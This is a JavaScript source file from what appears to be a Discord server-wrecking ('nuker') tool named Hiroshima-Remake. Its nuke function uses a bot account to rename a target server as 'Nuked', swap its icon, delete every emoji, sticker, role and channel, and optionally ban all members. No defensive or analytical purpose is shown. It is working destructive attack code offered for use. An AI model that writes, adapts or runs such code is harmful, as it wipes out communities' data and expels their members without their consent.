import { ChannelManager } from "./channel.js";
import { RoleManager } from "./role.js";
import checkPermissions from "./checkPermission.js";
import { client } from "../index.js";
import { selectedGuild } from "../alert/getGuild.js";
import EmojiManager from "./emoji.js";
import pc from "picocolors";
import logger from "../logging/logger.js";
import MemberManager from "./member.js";
import readline from "readline";

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

export default async function nuke() {
  const guild = await client.guilds.fetch(selectedGuild.id);
  const bot = await guild.members.fetch(client.user.id);

  if (!(await checkPermissions(bot))) return;
  console.log(pc.green(`Nuking Server: ${guild.name}`));
  console.log(pc.yellow("Changing the server name..."));

  await logger.info("Changing the server name...");
  await guild.setName("Nuked By Hiroshima-Remake");

  console.log(pc.green("Server name changed successfully"));
  await logger.info("Server name changed successfully");

  console.log(pc.yellow("Changing server icon..."));
  await logger.info("Changing server icon...");
  await guild.setIcon(
    "https://i.ibb.co/WN9MmvJs/the-kingth-of-kutet-thukuna.jpg"
  );

  console.log(pc.green("Server icon changed successfully"));
  await logger.info("Server icon changed successfully");

  // Delete everything asynchronously
  await Promise.all([
    EmojiManager.deleteEveryEmoji(guild),
    EmojiManager.deleteEverySticker(guild),
    RoleManager.deleteEveryRole(guild),
    ChannelManager.deleteEveryChannel(guild),
  ]);

  rl.question(
    pc.yellow("Do you want to ban everyone from the server? (y/n): "),
    async (answer) => {
      if (answer.toLowerCase().startsWith("y")) {
        await MemberManager.banEveryone(guild);
      }
      rl.close();
    }
  );
  // Create channels after deletions
  await ChannelManager.createChannel(guild);
}
